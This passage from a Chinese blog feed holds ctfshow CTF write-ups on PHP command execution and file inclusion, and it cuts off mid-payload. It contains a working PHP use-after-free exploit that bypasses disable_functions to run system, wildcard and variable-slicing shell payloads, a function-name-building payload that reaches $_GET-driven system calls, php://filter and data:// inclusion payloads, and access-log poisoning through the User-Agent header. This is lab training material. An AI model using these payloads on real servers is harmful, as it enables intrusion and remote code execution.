class="line"><span class="variable">$n_alloc</span> = 10; <span class="comment"># increase this value if UAF fails</span></span><br><span class="line"><span class="variable">$contiguous</span> = [];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">    <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$abc</span> = <span class="variable">$backtrace</span>[1][<span class="string">&#x27;args&#x27;</span>][0];</span><br><span class="line"></span><br><span class="line"><span class="variable">$helper</span> = new Helper;</span><br><span class="line"><span class="variable">$helper</span>-&gt;b = <span class="keyword">function</span> (<span class="variable">$x</span>) &#123; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == 79 || strlen(<span class="variable">$abc</span>) == 0) &#123;</span><br><span class="line">    die(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># leaks</span></span><br><span class="line"><span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, 0);</span><br><span class="line"><span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, 0x58);</span><br><span class="line"><span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - 0xc8;</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake value</span></span><br><span class="line">write(<span class="variable">$abc</span>, 0x60, 2);</span><br><span class="line">write(<span class="variable">$abc</span>, 0x70, 6);</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake reference</span></span><br><span class="line">write(<span class="variable">$abc</span>, 0x10, <span class="variable">$abc_addr</span> + 0x60);</span><br><span class="line">write(<span class="variable">$abc</span>, 0x18, 0xa);</span><br><span class="line"></span><br><span class="line"><span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, 0x20);</span><br><span class="line"></span><br><span class="line"><span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, 8);</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">    die(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">    die(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">    die(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">    die(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake closure object</span></span><br><span class="line"><span class="variable">$fake_obj_offset</span> = 0xd0;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; 0x110; <span class="variable">$i</span> += 8) &#123;</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># pwn</span></span><br><span class="line">write(<span class="variable">$abc</span>, 0x20, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">write(<span class="variable">$abc</span>, 0xd0 + 0x38, 1, 4); <span class="comment"># internal func type</span></span><br><span class="line">write(<span class="variable">$abc</span>, 0xd0 + 0x68, <span class="variable">$zif_system</span>); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">(<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">利用mysql load_file读文件   //过75,76</span><br><span class="line">try &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = new PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  foreach(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) as <span class="variable">$row</span>) &#123;   //flag36d.txt</span><br><span class="line">      <span class="built_in">echo</span>(<span class="variable">$row</span>[0]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = null;</span><br><span class="line">&#125; catch (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">  die();</span><br><span class="line">&#125;</span><br><span class="line">通过FFI（7.4版本）   //过77</span><br><span class="line">c=<span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(char *command);&quot;</span>, <span class="string">&quot;libc.so.6&quot;</span>);<span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; xxx.txt&#x27;</span>;<span class="variable">$ffi</span>-   &gt;system(<span class="variable">$a</span>);<span class="built_in">exit</span>();   //访问xxx.txt</span><br></pre></td></tr></table></figure><h2 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737942.png" alt="chrome_YSY1xydUVD"></p><p>这个题是羽师傅改编的</p><p>在原来过滤的基础上增加了数字的过滤。<br>linux中存在的大量的内置变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">月饼杯web3   payload:<span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:5:1&#125;</span> ????.??? 构造出的是 nl flag.php</span><br><span class="line">所有我们现在想到简易一点的方法就是得到一个n一个l</span><br><span class="line">发现 <span class="variable">$PATH</span>的最后一位是n <span class="variable">$PWD</span>的最后一位 也就是 /var/www/html的最后一位是l</span><br><span class="line">在linux中可以用~获取变量的最后几位</span><br></pre></td></tr></table></figure><p>而字母起到的作用是和0相同的，所有<code>$&#123;PATH:~A&#125;</code>其实就是<code>$&#123;PATH:~0&#125;</code></p><p>从源码中看到了变量code，所以构造<code>payload：code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</code></p><p>输入并没有发现flag，后来在输入框输入<code>$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</code>，查看源代码得到flag</p><h2 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h2><p>同上一题</p><p>把path和bash过滤了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这时我们可以利用通配符 调用base64命令，也就是构造出 /bin/base64 flag.php</span><br><span class="line">/???<span class="number">4</span> ???.???</span><br><span class="line">如果可以构造出来/和<span class="number">4</span>不就可以了吗</span><br></pre></td></tr></table></figure><p>只要找到一个变量的长度是4就可以了。/还是很好找的 <code>$PWD</code>的第一位就是了<br>我们发现<code>$&#123;#RANDOM&#125;</code>可以实现</p><p>不加<code>#</code>是变量的值，加了<code>#</code>是变量的值的长度。<br>这里大师傅们用了这两个内置变量：RANDOM和SHLVL。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">RANDOM</span><br><span class="line">此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。</span><br></pre></td></tr></table></figure><p>因此光利用RANDOM这个函数理论上就可以得到数字1-5了，不过相对来说4和5的概率会更大。</p><p>SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器</p><p><code>$&#123;#SHLVL&#125;=&gt;1</code></p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br><span class="line">/bin/base6 <span class="number">4</span> flag.php</span><br></pre></td></tr></table></figure><p>羽师傅的思路，可以理解，但是很难想到用这种方法绕过</p><p>多试几次即可出现base64后的flag</p><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737943.png" alt="chrome_AIWXSzD9PO"></p><p>重复的删掉一段并删除+号</p><h2 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737944.png" alt="chrome_CrmaHuAXkI"></p><p>把源码放出来，但是题还是那个题，多过滤了一个<code>|HOME|</code>，不影响操作</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PWD::$&#123;<span class="comment">#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span></span><br><span class="line">/bin/base6 <span class="number">4</span> flag.php</span><br></pre></td></tr></table></figure><h2 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737945.png" alt="chrome_SKumDWAvgc"></p><p>过滤掉了SHLVL，放出了PWD和RANDOM</p><p>过滤了SHLVL，这时可以考虑用 <code>$?</code>替代</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$?</span><br><span class="line">用途：上一条命令执行结束后的传回值。通常<span class="number">0</span>代表执行成功，非<span class="number">0</span>代表执行有误。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: code=$&#123;PWD::$&#123;#?&#125;&#125;???$&#123;PWD::$&#123;#?&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</span><br></pre></td></tr></table></figure><p>不得不说羽师傅把这个真的研究很透，这些内置变量很多都不知道</p><h2 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041737946.png" alt="chrome_To8cEYQ66g"></p><p>增加了<code>#</code>和PWD的过滤，使得我们无法通过获取内置变量的长度获取字符串，PWD可以用HOME代替，其他的没有改变，也就是说我们只要能得到一个数字1就能通过。</p><p>上一题不是用了<code>$?</code>，这道继续</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????.???</span><br></pre></td></tr></table></figure><h2 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="comment">//例子 c=20-1</span></span><br><span class="line">  <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">  <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">  preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>); </span><br><span class="line">  <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">      <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//帮你算出答案</span></span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目太长了，上源码</p><p>代码审计，不是很难理解，get传入的参数c的长度不能超过80，而且不能有那些奇怪的字符，而且还要符合正则表达式</p><p>可以进制转换的函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">base_convert(number,frombase,tobase);</span><br><span class="line">参数描述</span><br><span class="line">number    必需。规定要转换的数。</span><br><span class="line">frombase必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line">tobase    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。</span><br><span class="line"></span><br><span class="line">bindec — 二进制转换为十进制</span><br><span class="line">bindec ( string <span class="variable">$binary_string</span> ) : number</span><br><span class="line"></span><br><span class="line">decbin — 十进制转换为二进制</span><br><span class="line">decbin ( int <span class="variable">$number</span> ) : string</span><br><span class="line"></span><br><span class="line">dechex — 十进制转换为十六进制</span><br><span class="line">dechex ( int <span class="variable">$number</span> ) : string</span><br><span class="line"></span><br><span class="line">decoct — 十进制转换为八进制</span><br><span class="line">decoct ( int <span class="variable">$number</span> ) : string</span><br><span class="line"></span><br><span class="line">hexdec — 十六进制转换为十进制</span><br><span class="line">hexdec ( int <span class="variable">$number</span> ) : string</span><br></pre></td></tr></table></figure><p>在这个题中，我们不能使用除题目白名单中给出的函数以外的任何字符。那我们的目的就是构造出字母或者构造出函数。<br>假设我们要构造出如下表达式</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b])&amp;a=system&amp;b=cat flag</span><br></pre></td></tr></table></figure><p>我们需要构造的是其实只有 _GET，$我们可以使用，中括号可用花括号代替，小括号也是可以使用的。</p><p>这时候我们想到了一个办法，如果可以构造出hex2bin函数就可以将16进制转换成字符串了。</p><p>我们又可以用decoct将10进制转换成16进制。也就是可以将10进制转换成字符串。<br>那么问题来了，hex2bin怎么构造呢，这时候就需要用到base_convert了。<br>我们发现36进制中包含了所有的数字和字母，所以只需要将hex2bin按照36进制转换成10进制就可以了。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> base_convert(<span class="string">&#x27;hex2bin&#x27;</span>, 36, 10); 结果  37907361743 </span><br><span class="line"><span class="built_in">echo</span> hexdec(bin2hex(<span class="string">&quot;_GET&quot;</span>)); 结果 1598506324</span><br></pre></td></tr></table></figure><p>现在我们要做的就是反过来了</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">base_convert(<span class="string">&#x27;37907361743&#x27;</span>,10,36);    hex2bin</span><br><span class="line">base_convert(<span class="string">&#x27;37907361743&#x27;</span>,10,36)(dechex(<span class="string">&#x27;1598506324&#x27;</span>));    _GET</span><br></pre></td></tr></table></figure><p>a，b要换成题目白名单里的词，比如我的pi,abs,acos<br><code>[]</code>用<code>()</code>替代</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">用到了php特性</span><br><span class="line">$a=&quot;system&quot;;</span><br><span class="line">$a(&quot;ls&quot;);</span><br><span class="line">这样php会执行 system (&#x27;ls&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=_GET;$$pi&#123;abs&#125;($$pi&#123;acos&#125;)&amp;abs=system&amp;acos=tac f*</span><br></pre></td></tr></table></figure><p>我们再把_GET进行替换</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));<span class="variable">$$pi</span>&#123;abs&#125;(<span class="variable">$$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=tac f*</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;ctfshow-命令执行&quot;&gt;&lt;a href=&quot;#ctfshow-命令执行&quot; class=&quot;headerlink&quot; title=&quot;ctfshow.命令执行&quot;&gt;&lt;/a&gt;ctfshow.命令执行&lt;/h1&gt;&lt;h3 id=&quot;类型一-web29-36&quot;&gt;&lt;a href=&quot;#类型一-web29-36&quot; class=&quot;headerlink&quot; title=&quot;类型一:web29-36&quot;&gt;&lt;/a&gt;类型一:web29-36&lt;/h3&gt;&lt;p&gt;变量c来接受并过滤传入的数据,eval函数来执行 &lt;/p&gt;
&lt;h3 id=&quot;类型二-web37-41&quot;&gt;&lt;a href=&quot;#类型二-web37-41&quot; class=&quot;headerlink&quot; title=&quot;类型二:web37-41&quot;&gt;&lt;/a&gt;类型二:web37-41&lt;/h3&gt;&lt;p&gt;变量c接收并过滤传入的数据,include来包含文件&lt;/p&gt;
&lt;h3 id=&quot;类型三-web42-57&quot;&gt;&lt;a href=&quot;#类型三-web42-57&quot; class=&quot;headerlink&quot; title=&quot;类型三:web42-57&quot;&gt;&lt;/a&gt;类型三:web42-57&lt;/h3&gt;&lt;p&gt;接受并过滤传入的变量拼接命令执行（system函数）&lt;/p&gt;
&lt;h3 id=&quot;类型四-web58-77&quot;&gt;&lt;a href=&quot;#类型四-web58-77&quot; class=&quot;headerlink&quot; title=&quot;类型四:web58-77&quot;&gt;&lt;/a&gt;类型四:web58-77&lt;/h3&gt;&lt;p&gt;PHP代码执行，突破禁用函数,绕过disable_functions&lt;/p&gt;</summary>
    
    
    
    <category term="WEB" scheme="http://yun421.top/categories/WEB/"/>
    
    
  </entry>
  
  <entry>
    <title>ctfshow.文件包含</title>
    <link href="http://yun421.top/2021/11/19/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://yun421.top/2021/11/19/ctfshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2021-11-19T03:56:48.000Z</published>
    <updated>2022-03-04T09:36:50.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ctfshow-文件包含"><a href="#ctfshow-文件包含" class="headerlink" title="ctfshow.文件包含"></a>ctfshow.文件包含</h1><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736077.png" alt="chrome_gPlSkedlQV"></p><p><strong>filter伪协议</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><span id="more"></span><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736078.png" alt="chrome_tCjr7StG2W"></p><p>这道题把php替换为<code>???</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdubCBmbGFnLnBocCcpOw==</span><br></pre></td></tr></table></figure><p>base64编码内容为<code>&lt;?php system(&#39;nl flag.php&#39;);</code></p><p>注意：base64中不要出现<code>+</code>，因为url编码中这是空格</p><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736079.png" alt="chrome_anzwgLv8qj"></p><p>又把data给替换了<code>???</code></p><p>包含日志文件 进行getshell </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>添加<code>UA=\&lt;?php system(&#39;ls&#39;);?&gt;</code>发现可以执行,并看到fl0g.php</p><p>注意：要先写入UA，再包含日志文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：\&lt;?php system(‘tac fl0g.php’);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736080.png" alt="chrome_Mva7xAlUTb"></p><p>把:替换为<code>???</code>，不影响操作</p><p>包含日志文件 进行getshell </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>添加<code>UA=\&lt;?php system(&#39;ls&#39;);?&gt;</code>发现可以执行,并看到fl0g.php</p><p>注意：要先写入UA，再包含日志文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：\&lt;?php system(‘tac fl0g.php’);?&gt;</span><br></pre></td></tr></table></figure><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736081.png" alt="chrome_cZ6HAPSlJa"></p><p>把.替换为<code>???</code>，不影响操作</p><h2 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h2><p><img src="https://gitee.com/yun421/picgo/raw/master/img/202203041736082.png" alt="chrome_bxj969wn5l"></p><p>文件名可以通过两次url全编码绕过<br>因为前面有die，所以我们后面直接写php内容会起不到作用</p><p>payload</p><p>GET</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file=%<span class="number">2570</span>%<span class="number">2568</span>%<span class="number">2570</span>%<span class="number">253</span>a%<span class="number">252</span>f%<span class="number">252</span>f%<span class="number">2566</span>%<span class="number">2569</span>%<span class="number">256</span>c%<span class="number">2574</span>%<span class="number">2565</span>%<span class="number">2572</span>%<span class="number">252</span>f%<span class="number">2577</span>%<span class="number">2572</span>%<span class="number">2569</span>%<span class="number">2574</span>%<span class="number">2565</span>%<span class="number">253</span>d%<span class="number">2563</span>%<span class="number">256</span>f%<span class="number">256</span>e%<span class="number">2576</span>%<span class="number">2565</span>%<span class="number">2572</span>%<span class="number">2574</span>%<span class="number">252</span>e%<span class="number">2562</span>%<span class="number">2561</span>%<span class="number">2573</span>%<span class="number">2565</span>%<span class="number">2536</span>%<span class="number">2534</span>%<span class="number">252</span>d%<span class="number">2564</span>%<span class="number">2565</span>%<span class="number">2563</span>%<span class="number">256</span>f%<span class="number">2564</span>%<span class="number">2565</span>%<span class="number">252</span>f%<span class="number">2572</span>%<span class="number">2565</span>%<span class="number">2573</span>%<span class="number">256</span>f%<span class="number">2575</span>%<span class="number">2572</span>%<span class="number">2563</span>%<span 